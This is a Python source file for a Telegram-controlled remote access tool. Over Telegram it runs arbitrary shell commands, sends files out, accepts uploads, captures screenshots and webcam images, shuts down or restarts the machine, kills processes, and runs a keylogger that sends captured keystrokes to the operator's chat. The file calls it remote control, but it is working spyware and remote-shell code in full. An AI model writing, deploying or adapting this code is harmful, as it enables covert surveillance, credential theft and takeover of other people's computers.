import telebot
import os
import pyautogui
import subprocess
import platform
import socket
import psutil
import requests
import cv2
import ctypes
import keyboard
import webbrowser
from datetime import datetime
from threading import Thread

BOT_TOKEN = ''
AUTHORIZED_USER_ID = 

bot = telebot.TeleBot(BOT_TOKEN)
keylog_active = False
keylog_data = []

def is_authorized(message):
    return message.from_user.id == AUTHORIZED_USER_ID

def get_system_info():
    ip = requests.get('https://api.ipify.org').text
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    os_info = platform.platform()
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    return f"📡 Public IP: {ip}\n Hostname: {hostname}\n Local IP: {local_ip}\n OS: {os_info}\n CPU: {cpu}%\n RAM: {ram}%"

@bot.message_handler(commands=['start'])
def start(message):
    if is_authorized(message):
        bot.reply_to(message, " Remote control started.")
    else:
        bot.reply_to(message, "Access denied.")

@bot.message_handler(commands=['sysinfo'])
def sysinfo(message):
    if is_authorized(message):
        bot.reply_to(message, get_system_info())

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if is_authorized(message):
        path = f"screenshot_{datetime.now().strftime('%H%M%S')}.png"
        pyautogui.screenshot().save(path)
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f)
        os.remove(path)

@bot.message_handler(commands=['webcam'])
def webcam(message):
    if is_authorized(message):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            path = f"webcam_{datetime.now().strftime('%H%M%S')}.jpg"
            cv2.imwrite(path, frame)
            cap.release()
            with open(path, 'rb') as f:
                bot.send_photo(message.chat.id, f)
            os.remove(path)
        else:
            bot.reply_to(message, " Failed to access webcam.")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    if is_authorized(message):
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        else:
            subprocess.run(["shutdown", "-h", "now"])
        bot.reply_to(message, "Shutting down...")

@bot.message_handler(commands=['restart'])
def restart(message):
    if is_authorized(message):
        if platform.system() == "Windows":
            os.system("shutdown /r /t 0")
        else:
            subprocess.run(["reboot"])
        bot.reply_to(message, "Restarting...")

@bot.message_handler(commands=['lock'])
def lock(message):
    if is_authorized(message):
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
            bot.reply_to(message, " PC locked.")
        else:
            bot.reply_to(message, " Lock not supported on this OS.")

@bot.message_handler(commands=['cmd'])
def run_command(message):
    if is_authorized(message):
        try:
            command = message.text.split(' ', 1)[1]
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=15, text=True)
            bot.reply_to(message, output[:4000])
        except Exception as e:
            bot.reply_to(message, str(e))

@bot.message_handler(commands=['download'])
def download_file(message):
    if is_authorized(message):
        try:
            path = message.text.split(' ', 1)[1]
            with open(path, 'rb') as f:
                bot.send_document(message.chat.id, f)
        except Exception as e:
            bot.reply_to(message, f" Error: {e}")

@bot.message_handler(commands=['upload'])
def upload_instructions(message):
    if is_authorized(message):
        bot.reply_to(message, "Send the file to upload. I will save it in the current directory.")

@bot.message_handler(content_types=['document'])
def save_file(message):
    if is_authorized(message):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(message.document.file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f" Saved file: {message.document.file_name}")

@bot.message_handler(commands=['processes'])
def list_processes(message):
    if is_authorized(message):
        output = "Running Processes:\n"
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.as_dict(attrs=['pid', 'name', 'cpu_percent', 'memory_percent'])
                output += f"PID: {info['pid']} | Name: {info['name']} | CPU: {info['cpu_percent']}% | Mem: {info['memory_percent']:.2f}%\n"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        bot.reply_to(message, output[:4000])

@bot.message_handler(commands=['kill'])
def kill_process(message):
    if is_authorized(message):
        try:
            pid = int(message.text.split(' ', 1)[1])
            proc = psutil.Process(pid)
            proc.terminate()
            bot.reply_to(message, f" Process {pid} terminated.")
        except Exception as e:
            bot.reply_to(message, f" Error: {e}")

@bot.message_handler(commands=['volume'])
def adjust_volume(message):
    if is_authorized(message):
        if platform.system() == "Windows":
            try:
                action = message.text.split(' ', 1)[1].lower()
                if action == "up":
                    pyautogui.press('volumeup')
                    bot.reply_to(message, " Volume increased.")
                elif action == "down":
                    pyautogui.press('volumedown')
                    bot.reply_to(message, " Volume decreased.")
                elif action == "mute":
                    pyautogui.press('volumemute')
                    bot.reply_to(message, " Volume muted.")
                else:
                    bot.reply_to(message, " Use: /volume up/down/mute")
            except IndexError:
                bot.reply_to(message, " Use: /volume up/down/mute")
            except Exception as e:
                bot.reply_to(message, f" Error: {e}")
        else:
            bot.reply_to(message, " Volume control not supported on this OS.")

@bot.message_handler(commands=['keylog'])
def keylogger(message):
    global keylog_active, keylog_data
    if is_authorized(message):
        action = message.text.split(' ', 1)[1].lower() if len(message.text.split()) > 1 else None
        if action == "start":
            if not keylog_active:
                keylog_active = True
                keylog_data = []
                Thread(target=run_keylogger, args=(message.chat.id,)).start()
                bot.reply_to(message, " Keylogger started.")
            else:
                bot.reply_to(message, " Keylogger already running.")
        elif action == "stop":
            if keylog_active:
                keylog_active = False
                bot.reply_to(message, f" Keylogger stopped. Captured: {''.join(keylog_data)[:4000]}")
            else:
                bot.reply_to(message, " Keylogger not running.")
        else:
            bot.reply_to(message, " Use: /keylog start/stop")

def run_keylogger(chat_id):
    global keylog_active, keylog_data
    while keylog_active:
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                if len(key) == 1 or key in ['space', 'enter', 'backspace']:
                    if key == 'space':
                        keylog_data.append(' ')
                    elif key == 'enter':
                        keylog_data.append('\n')
                    elif key == 'backspace':
                        if keylog_data:
                            keylog_data.pop()
                    else:
                        keylog_data.append(key)
                    if len(''.join(keylog_data)) > 1000:
                        bot.send_message(chat_id, f"Keys: {''.join(keylog_data)[:4000]}")
                        keylog_data = []
        except Exception:
            keylog_active = False
            bot.send_message(chat_id, " Keylogger stopped due to error.")

@bot.message_handler(commands=['openurl'])
def open_url(message):
    if is_authorized(message):
        try:
            url = message.text.split(' ', 1)[1]
            webbrowser.open(url)
            bot.reply_to(message, f" Opened URL: {url}")
        except Exception as e:
            bot.reply_to(message, f" Error: {e}")

@bot.message_handler(commands=['message'])
def show_message(message):
    if is_authorized(message):
        try:
            text = message.text.split(' ', 1)[1]
            if platform.system() == "Windows":
                ctypes.windll.user32.MessageBoxW(0, text, "Message", 0)
                bot.reply_to(message, " Message displayed.")
            else:
                bot.reply_to(message, " Message box not supported on this OS.")
        except Exception as e:
            bot.reply_to(message, f" Error: {e}")

@bot.message_handler(func=lambda m: True)
def fallback(message):
    if is_authorized(message):
        bot.reply_to(message, "Unknown command. Try:\n/sysinfo\n/screenshot\n/webcam\n/shutdown\n/restart\n/lock\n/cmd <command>\n/download <path>\n/upload\n/processes\n/kill <pid>\n/volume <up/down/mute>\n/keylog <start/stop>\n/openurl <url>\n/message <text>")

bot.polling()